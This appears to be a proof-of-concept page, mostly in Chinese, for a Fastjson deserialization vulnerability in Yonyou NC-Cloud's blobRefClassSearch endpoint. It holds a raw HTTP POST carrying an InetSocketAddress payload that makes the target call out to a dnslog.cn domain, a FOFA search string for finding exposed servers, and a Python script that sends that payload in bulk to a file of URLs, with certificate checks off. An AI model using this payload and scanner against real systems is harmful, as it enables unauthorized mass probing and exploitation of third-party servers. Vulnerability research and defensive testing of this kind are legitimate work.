```
POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
Content-Type: application/json

{"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"Test.Fastjson.dnslog.cn\"}}}"}
```

fofa

```
app="用友-NC-Cloud"
```





批量脚本

```
# encoding:utf-8
import time
import requests
import argparse
import ssl
import urllib3
import re
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

# ssl._create_unverified_context：创建一个 SSL 上下文，用于处理 HTTPS 请求时不验证服务器证书的情况。
ssl._create_default_https_context = ssl._create_unverified_context
# urllib3.disable_warnings()：禁用 urllib3 库的不安全请求警告，即不显示由于不安全的 HTTPS 请求而引发的警告信息。
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# 打印颜色
RED = '\033[31m'
GREEN = '\033[32m'
RESET = '\033[0m'


def check_vuln(url):
    url = url.strip("/")
    target = url + "/ncchr/pm/ref/indiIssued/blobRefClassSearch"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Content-Type': 'application/json'
    }
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Cookie": "PHPSESSID=pgqapiopj5rssr6a2ejvsi69m3; b-user-id=98195658-f7ad-f233-35b2-5f6d469d240d"
    }
    dnslog_url = "http://dnslog.cn/getdomain.php"
    try:
        getdomain = requests.get(dnslog_url, headers=headers1, verify=False, timeout=20)
        domain = str(getdomain.text)
        data = f'{{"clientParam":"{{\\"x\\":{{\\"@type\\":\\"java.net.InetSocketAddress\\"{{\\"address\\":,\\"val\\":\\"111111.{domain}\\"}}}}}}"}}'
        response = requests.post(target, headers=headers, data=data, verify=False, timeout=20)
        for i in range(0, 3):
            refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers=headers1, timeout=60)
            time.sleep(2)
            if domain in refresh.text:
                print(f"{RED}[+] {url} 存在YongYouNC-Cloud-blobRefClassSearch-fastjson反序列化漏洞{RESET}")
                return True
            else:
                print(f"{GREEN}[+] {url} 不存在YongYouNC-Cloud-blobRefClassSearch-fastjson反序列化漏洞{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{GREEN}[-] {url} 请求失败{RESET}")


def main():
    parser = argparse.ArgumentParser(description='YongYouNC-Cloud-blobRefClassSearch-Fastjson反序列化漏洞检测')
    parser.add_argument('-u', '--url', help='目标URL')
    parser.add_argument('-f', '--file', help='目标URL文件')

    args = parser.parse_args()

    if args.url:
        url = "http://" + args.url if not args.url.startswith(('http://', 'https://')) else args.url
        check_vuln(url)
    elif args.file:
        with open(args.file, 'r') as f:
            urls = f.read().splitlines()
            for url in urls:
                url = "http://" + url if not url.startswith(('http://', 'https://')) else url
                check_vuln(url)


if __name__ == '__main__':
    main()

```

